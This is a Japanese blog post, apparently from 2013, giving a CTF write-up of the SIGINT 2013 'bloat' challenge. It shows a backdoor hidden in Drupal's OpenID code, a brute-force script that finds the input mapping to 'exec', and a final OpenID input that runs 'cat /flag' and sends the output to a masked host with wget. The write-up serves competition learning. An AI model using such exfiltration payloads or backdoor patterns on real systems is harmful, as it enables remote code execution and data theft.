<!doctype html><html lang=en itemscope itemtype=http://schema.org/WebPage><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><title>SIGINT CTF 2013 writeup – bloat (cloud 200) - blog.tyage.net</title><meta name=description content="CTF
えと、ブログを更新停止している間に、Epsilon DeltaとしていくつかCTFに参加していました。

Codegate YUT Preliminary 2013
Nuit du Hack CTF Quals 2013
BaltCTF Quals 2013
SECUINSIDE CTF Quals 2013
Boston Key Party CTF 2013
DEF CON CTF Qualifier 2013
SIGINT CTF 2013

はじめは海外のCTFの感覚がつかめず、ちゃんと解いたような記憶もなかったのですが、BKPあたりからは少し慣れてきたような気がします。
今まで解いてた問題のwrite upを書こうとも思ったのですが、すっかり忘れてしまっているため、一番最近やったSIGINT CTFのwrite upを書くことにします。"><meta name=author content="tyage"><script type=application/ld+json>{"@context":"http://schema.org","@type":"WebSite","name":"blog.tyage.net","url":"https:\/\/blog.tyage.dev\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Organization","name":"","url":"https:\/\/blog.tyage.dev\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https:\/\/blog.tyage.dev\/","name":"home"}},{"@type":"ListItem","position":3,"item":{"@id":"https:\/\/blog.tyage.dev\/p689\/","name":"S i g i n t c t f 2013 writeup – bloat (cloud 200)"}}]}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Article","author":{"name":"tyage"},"headline":"SIGINT CTF 2013 writeup – bloat (cloud 200)","description":"CTF えと、ブログを更新停止している間に、Epsilon DeltaとしていくつかCTFに参加していました。\n Codegate YUT Preliminary 2013 Nuit du Hack CTF Quals 2013 BaltCTF Quals 2013 SECUINSIDE CTF Quals 2013 Boston Key Party CTF 2013 DEF CON CTF Qualifier 2013 SIGINT CTF 2013  はじめは海外のCTFの感覚がつかめず、ちゃんと解いたような記憶もなかったのですが、BKPあたりからは少し慣れてきたような気がします。\n今まで解いてた問題のwrite upを書こうとも思ったのですが、すっかり忘れてしまっているため、一番最近やったSIGINT CTFのwrite upを書くことにします。\n","inLanguage":"en","wordCount":150,"datePublished":"2013-07-16T20:23:45","dateModified":"2013-07-16T20:23:45","image":"https:\/\/blog.tyage.dev\/icon\/icon.jpg","keywords":[""],"mainEntityOfPage":"https:\/\/blog.tyage.dev\/p689\/","publisher":{"@type":"Organization","name":"https:\/\/blog.tyage.dev\/","logo":{"@type":"ImageObject","url":"https:\/\/blog.tyage.dev\/icon\/icon.jpg","height":60,"width":60}}}</script><meta property="og:title" content="SIGINT CTF 2013 writeup – bloat (cloud 200)"><meta property="og:description" content="CTF
えと、ブログを更新停止している間に、Epsilon DeltaとしていくつかCTFに参加していました。

Codegate YUT Preliminary 2013
Nuit du Hack CTF Quals 2013
BaltCTF Quals 2013
SECUINSIDE CTF Quals 2013
Boston Key Party CTF 2013
DEF CON CTF Qualifier 2013
SIGINT CTF 2013

はじめは海外のCTFの感覚がつかめず、ちゃんと解いたような記憶もなかったのですが、BKPあたりからは少し慣れてきたような気がします。
今まで解いてた問題のwrite upを書こうとも思ったのですが、すっかり忘れてしまっているため、一番最近やったSIGINT CTFのwrite upを書くことにします。"><meta property="og:image" content="https://blog.tyage.dev/icon/icon.jpg"><meta property="og:url" content="https://blog.tyage.dev/p689/"><meta property="og:type" content="website"><meta property="og:site_name" content="blog.tyage.net"><meta name=twitter:title content="SIGINT CTF 2013 writeup – bloat (cloud 200)"><meta name=twitter:description content="CTF
えと、ブログを更新停止している間に、Epsilon DeltaとしていくつかCTFに参加していました。

Codegate YUT Preliminary 2013
Nuit du Hack CTF Quals 2013
BaltCTF Quals 2013
SECUINSIDE CTF Quals 2013
Boston Key Party CTF 2013
DEF CON CTF …"><meta name=twitter:image content="https://blog.tyage.dev/icon/icon.jpg"><meta name=twitter:card content="summary"><meta name=twitter:site content="@tyage"><meta name=twitter:creator content="@tyage"><meta name=generator content="Hugo 0.69.0"><link rel=alternate href=https://blog.tyage.dev/index.xml type=application/rss+xml title=blog.tyage.net><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css integrity=sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y crossorigin=anonymous><link rel=stylesheet href=https://use.fontawesome.com/releases/v5.5.0/css/all.css integrity=sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU crossorigin=anonymous><link rel=stylesheet href=https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css integrity=sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u crossorigin=anonymous><link rel=stylesheet href=https://blog.tyage.dev/css/main.css><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic"><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800"><link rel=stylesheet href=https://blog.tyage.dev/css/syntax.css><link rel=stylesheet href=https://blog.tyage.dev/css/codeblock.css><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css integrity=sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh crossorigin=anonymous><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css integrity=sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R crossorigin=anonymous><script type=application/javascript>var doNotTrack=false;if(!doNotTrack){window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create','UA-3879973-3','auto');ga('send','pageview');}</script><script async src=https://www.google-analytics.com/analytics.js></script></head><body><nav class="navbar navbar-default navbar-fixed-top navbar-custom"><div class=container-fluid><div class=navbar-header><button type=button class=navbar-toggle data-toggle=collapse data-target=#main-navbar>
<span class=sr-only>Toggle navigation</span>
<span class=icon-bar></span><span class=icon-bar></span><span class=icon-bar></span></button>
<a class=navbar-brand href=https://blog.tyage.dev/>blog.tyage.net</a></div><div class="collapse navbar-collapse" id=main-navbar><ul class="nav navbar-nav navbar-right"></ul></div><div class=avatar-container><div class=avatar-img-border><a title=blog.tyage.net href=https://blog.tyage.dev/><img class=avatar-img src=https://blog.tyage.dev/icon/icon.jpg alt=blog.tyage.net></a></div></div></div></nav><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><header class=header-section><div class="intro-header no-img"><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><div class=post-heading><h1>SIGINT CTF 2013 writeup – bloat (cloud 200)</h1><span class=post-meta><i class="fas fa-calendar"></i>&nbsp;Posted on July 16, 2013
&nbsp;|&nbsp;<i class="fas fa-user"></i>&nbsp;tyage</span></div></div></div></div></div></header><div class=container role=main><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><article role=main class=blog-post><h3>CTF</h3><p>えと、ブログを更新停止している間に、Epsilon DeltaとしていくつかCTFに参加していました。</p><ul><li>Codegate YUT Preliminary 2013</li><li>Nuit du Hack CTF Quals 2013</li><li>BaltCTF Quals 2013</li><li>SECUINSIDE CTF Quals 2013</li><li>Boston Key Party CTF 2013</li><li>DEF CON CTF Qualifier 2013</li><li>SIGINT CTF 2013</li></ul><p>はじめは海外のCTFの感覚がつかめず、ちゃんと解いたような記憶もなかったのですが、BKPあたりからは少し慣れてきたような気がします。</p><p>今まで解いてた問題のwrite upを書こうとも思ったのですが、すっかり忘れてしまっているため、一番最近やったSIGINT CTFのwrite upを書くことにします。</p><p></p><hr><h3>bloat</h3><p><a href=https://ctf.sigint.ccc.de/challenges/24/>SIGINT CTF 2013 – bloat (cloud 200)</a></p><p>この問題は、PHPで作られたWebアプリケーションにバックドアが仕掛けられているので、それを発見しろという問題です。</p><p>ソースコードが配られているのでそれを見てバックドアを探します。</p><p>配布されたソースコードはDrupalを使用したものでした。</p><p>ということなので、早速diffをとってみるのですが、様々な場所の変数名が変更されており、またインデントや改行もめっちゃくちゃにされていたため、diffをとると何万行ものダミー変更部に悩まされることになり、バックドアの発見は難しくなっていました。</p><p>そこで、PHPの構文を解析して圧縮してくれる<a href=https://code.google.com/p/php-compressor/>php-compressor</a>を使用し、ファイルを圧縮した上でdiffをとってみました。<br>（実際には今回の問題用に圧縮後の変数名の命名方法を変更するなどしています。）</p><p>すると、何千行か関係のないdiffもあったのですが、openID関連のファイルにバックドアらしき変更がされているのが見つかりました。</p><div class=wp_syntax style=position:relative><table><tr><td class=line_numbers><pre>10
</pre></td><td class=code><pre class=php style=font-family:monospace><span style=color:#900>define</span><span style=color:#090>&#40;</span><span style=color:#00f>'OPENID_DH_DEFAULT_GEN'</span><span style=color:#393>,</span> <span style=color:#00f>'86'</span><span style=color:#090>&#41;</span><span style=color:#393>;</span></pre></td></tr></table></div><div class=wp_syntax style=position:relative><table><tr><td class=line_numbers><pre>211
212
213
214
215
216
217
218
219
220
</pre></td><td class=code><pre class=php style=font-family:monospace>      <span style=color:#008>$discovery</span> <span style=color:#393>=</span> openid_discovery<span style=color:#090>&#40;</span><span style=color:#008>$imaginably</span><span style=color:#090>&#41;</span><span style=color:#393>;</span>
      <span style=color:#b1b100>if</span><span style=color:#090>&#40;</span><span style=color:#900>strpos</span><span style=color:#090>&#40;</span><span style=color:#008>$imaginably</span><span style=color:#393>,</span> <span style=color:#00f>'@'</span><span style=color:#090>&#41;</span><span style=color:#090>&#41;</span>
  <span style=color:#090>&#123;</span>
   <span style=color:#900>list</span><span style=color:#090>&#40;</span><span style=color:#008>$user</span><span style=color:#393>,</span> <span style=color:#008>$host</span><span style=color:#090>&#41;</span> <span style=color:#393>=</span> <span style=color:#900>explode</span><span style=color:#090>&#40;</span><span style=color:#00f>'@'</span><span style=color:#393>,</span> <span style=color:#008>$imaginably</span><span style=color:#393>,</span> <span style=color:#c6c>2</span><span style=color:#090>&#41;</span><span style=color:#393>;</span>
<span style=color:#090>&#125;</span>
<span style=color:#b1b100>else</span>
    <span style=color:#090>&#123;</span>
     <span style=color:#008>$user</span> <span style=color:#393>=</span> <span style=color:#090;font-weight:700>false</span><span style=color:#393>;</span>
     <span style=color:#008>$host</span> <span style=color:#393>=</span> <span style=color:#090;font-weight:700>false</span><span style=color:#393>;</span>
     <span style=color:#090>&#125;</span></pre></td></tr></table></div><div class=wp_syntax style=position:relative><table><tr><td class=line_numbers><pre>247
248
</pre></td><td class=code><pre class=php style=font-family:monospace><span style=color:#008>$user_enc</span> <span style=color:#393>=</span> _openid_dh_long_to_base64<span style=color:#090>&#40;</span><span style=color:#008>$user</span> <span style=color:#393>*</span> OPENID_DH_DEFAULT_GEN<span style=color:#090>&#41;</span><span style=color:#393>;</span>
    <span style=color:#008>$service</span><span style=color:#090>&#91;</span><span style=color:#00f>'uri'</span><span style=color:#090>&#93;</span> <span style=color:#393>=</span> drupal_map_assoc<span style=color:#090>&#40;</span><span style=color:#900>array</span><span style=color:#090>&#40;</span><span style=color:#008>$host</span><span style=color:#090>&#41;</span><span style=color:#393>,</span> <span style=color:#008>$user_enc</span><span style=color:#090>&#41;</span><span style=color:#393>;</span></pre></td></tr></table></div><p>drupal_map_assocをみてみると、array_mapを使用しているため、$user_encが関数名となればその関数を実行できるようだとわかりました。</p><p>そこで、実行できる関数を探すため、以下のscriptを走らせたところ、execとfile関数が実行可能であると判明しました。</p><div class=wp_syntax style=position:relative><table><tr><td class=code><pre class=php style=font-family:monospace><span style=color:#b1b100>for</span> <span style=color:#090>&#40;</span><span style=color:#008>$i</span><span style=color:#393>=</span><span style=color:#c6c>0</span><span style=color:#393>;</span><span style=color:#008>$i</span><span style=color:#393>&lt;</span><span style=color:#c6c>100000</span><span style=color:#393>;++</span><span style=color:#008>$i</span><span style=color:#090>&#41;</span> <span style=color:#090>&#123;</span>
  <span style=color:#008>$user_enc</span> <span style=color:#393>=</span> _openid_dh_long_to_base64<span style=color:#090>&#40;</span><span style=color:#008>$i</span> <span style=color:#393>*</span> <span style=color:#c6c>86</span><span style=color:#090>&#41;</span><span style=color:#393>;</span>
  <span style=color:#b1b100>if</span> <span style=color:#090>&#40;</span><span style=color:#900>is_callable</span><span style=color:#090>&#40;</span><span style=color:#008>$user_enc</span><span style=color:#090>&#41;</span><span style=color:#090>&#41;</span> <span style=color:#090>&#123;</span>
    <span style=color:#900>var_dump</span><span style=color:#090>&#40;</span><span style=color:#008>$user_enc</span><span style=color:#090>&#41;</span><span style=color:#393>;</span>
    <span style=color:#900>var_dump</span><span style=color:#090>&#40;</span><span style=color:#008>$i</span><span style=color:#090>&#41;</span><span style=color:#393>;</span>
  <span style=color:#090>&#125;</span>
<span style=color:#090>&#125;</span></pre></td></tr></table></div><p>=> 結果：</p><pre>
string(4) "exec"
int(93802)
string(4) "file"
int(96141)
</pre><p>ここまでくれば、あとはexec関数を実行するだけです。</p><p>しかし、関数の実行結果はレスポンスで帰ってこないため、wgetを使用して、結果を見れるようにしました。</p><p>色々したところ、/flagにflagがあることが判明したので、以下の文字列をopenIDに入力して送信し、flagを獲得しました。</p><pre>
93802@cat /flag | awk '{print "http://xxxxx/xxx?key=" $0;}' | xargs wget
</pre><h3>オチ</h3><p>最終的に解けたのはいいのですが、実はコンテストの開催期間を勘違いしており、問題をちゃんと解き始めた時点でコンテストが終わっていたのでした・・・</p><p>結局、ポイント的に今回はチームに貢献することができませんでしたorz</p><p>この問題のポイントを獲得したのは1チームだけだったようです。<br>参考にそのチームの方のwrite upを載せておきます。</p><p><a href=https://cesena.ing2.unibo.it/2013/07/07/sigint-2013-cloud200-bloat/>SIGINT 2013 – [cloud200] bloat</a></p><p>個人的には最後にncコマンドを使用したところは非常に参考になりました。<br>なんで思いつかなかったんだろう。。。</p><hr><section id=social-share><div class="list-inline footer-links"><div class=share-box aria-hidden=true><ul class=share><li><a href="//twitter.com/share?url=https%3a%2f%2fblog.tyage.dev%2fp689%2f&text=SIGINT%20CTF%202013%20writeup%20%e2%80%93%20bloat%20%28cloud%20200%29&via=tyage" target=_blank title="Share on Twitter"><i class="fab fa-twitter"></i></a></li><li><a href="//www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fblog.tyage.dev%2fp689%2f" target=_blank title="Share on Facebook"><i class="fab fa-facebook"></i></a></li><li><a href="//reddit.com/submit?url=https%3a%2f%2fblog.tyage.dev%2fp689%2f&title=SIGINT%20CTF%202013%20writeup%20%e2%80%93%20bloat%20%28cloud%20200%29" target=_blank title="Share on Reddit"><i class="fab fa-reddit"></i></a></li><li><a href="//www.linkedin.com/shareArticle?url=https%3a%2f%2fblog.tyage.dev%2fp689%2f&title=SIGINT%20CTF%202013%20writeup%20%e2%80%93%20bloat%20%28cloud%20200%29" target=_blank title="Share on LinkedIn"><i class="fab fa-linkedin"></i></a></li><li><a href="//www.stumbleupon.com/submit?url=https%3a%2f%2fblog.tyage.dev%2fp689%2f&title=SIGINT%20CTF%202013%20writeup%20%e2%80%93%20bloat%20%28cloud%20200%29" target=_blank title="Share on StumbleUpon"><i class="fab fa-stumbleupon"></i></a></li><li><a href="//www.pinterest.com/pin/create/button/?url=https%3a%2f%2fblog.tyage.dev%2fp689%2f&description=SIGINT%20CTF%202013%20writeup%20%e2%80%93%20bloat%20%28cloud%20200%29" target=_blank title="Share on Pinterest"><i class="fab fa-pinterest"></i></a></li></ul></div></div></section></article><ul class="pager blog-pager"><li class=previous><a href=https://blog.tyage.dev/p683/ data-toggle=tooltip data-placement=top title=サイト移転中です>&larr; Previous Post</a></li><li class=next><a href=https://blog.tyage.dev/p697/ data-toggle=tooltip data-placement=top title="DIMVA CTF 2013 writeup">Next Post &rarr;</a></li></ul></div></div></div><footer><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><ul class="list-inline text-center footer-links"><li><a href=https://github.com/tyage title=GitHub><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i><i class="fab fa-github fa-stack-1x fa-inverse"></i></span></a></li><li><a href=https://twitter.com/tyage title=Twitter><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i><i class="fab fa-twitter fa-stack-1x fa-inverse"></i></span></a></li><li><a href title=RSS><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i><i class="fas fa-rss fa-stack-1x fa-inverse"></i></span></a></li></ul><p class="credits copyright text-muted"><a href=https://tyage.net>tyage</a>
&nbsp;&bull;&nbsp;&copy;
2018
&nbsp;&bull;&nbsp;
<a href=https://blog.tyage.dev/>blog.tyage.net</a></p><p class="credits theme-by text-muted"><a href=https://gohugo.io>Hugo v0.69.0</a> powered &nbsp;&bull;&nbsp; Theme <a href=https://github.com/halogenica/beautifulhugo>Beautiful Hugo</a> adapted from <a href=https://deanattali.com/beautiful-jekyll/>Beautiful Jekyll</a></p></div></div></div></footer><script src=https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.js integrity=sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx crossorigin=anonymous></script><script src=https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/contrib/auto-render.min.js integrity=sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe crossorigin=anonymous></script><script src=https://code.jquery.com/jquery-1.12.4.min.js integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin=anonymous></script><script src=https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js integrity=sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa crossorigin=anonymous></script><script src=https://blog.tyage.dev/js/main.js></script><script>renderMathInElement(document.body);</script><script src=https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js integrity=sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy crossorigin=anonymous></script><script src=https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js integrity=sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q crossorigin=anonymous></script><script src=https://blog.tyage.dev/js/load-photoswipe.js></script></body></html>